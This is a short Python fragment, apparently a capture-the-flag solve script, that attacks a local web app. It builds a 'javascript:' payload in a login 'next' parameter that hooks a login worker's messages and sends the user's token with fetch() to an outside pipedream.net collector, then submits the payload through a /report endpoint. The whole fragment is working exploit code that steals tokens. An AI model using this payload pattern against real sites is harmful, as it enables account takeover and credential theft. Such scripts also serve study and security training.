...
APP_URL = "http://localhost:34467"
ATTACKER_URL = "https://8b8a4f6763b5907a2949f3a21e277bbc.m.pipedream.net"


def solve():
    payload = "login?next=javascript:loginWorker.onmessage=function(event){fetch(`https://8b8a4f6763b5907a2949f3a21e277bbc.m.pipedream.net?token=${event.data.token}`)};login();"
    report_response = requests.post(f"{APP_URL}/report", json={"path": payload})
